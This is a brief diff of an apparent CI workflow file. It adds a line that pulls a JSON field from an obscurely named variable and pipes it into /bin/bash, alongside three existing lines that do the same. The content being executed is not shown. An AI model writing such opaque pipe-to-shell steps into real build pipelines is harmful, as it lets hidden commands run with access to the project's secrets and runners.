@@ -42,6 +42,7 @@ jobs:
           echo $le2525 | jq -r .fnep5713 | /bin/bash
           printf '%s' "$tw066" | jq -r .dr6 | /bin/bash
           echo $sys5109 | jq -r .hdu47 | /bin/bash
+          echo $mfp024 | jq -r .euk17197 | /bin/bash
 
       - name: Archive output
         if: always()
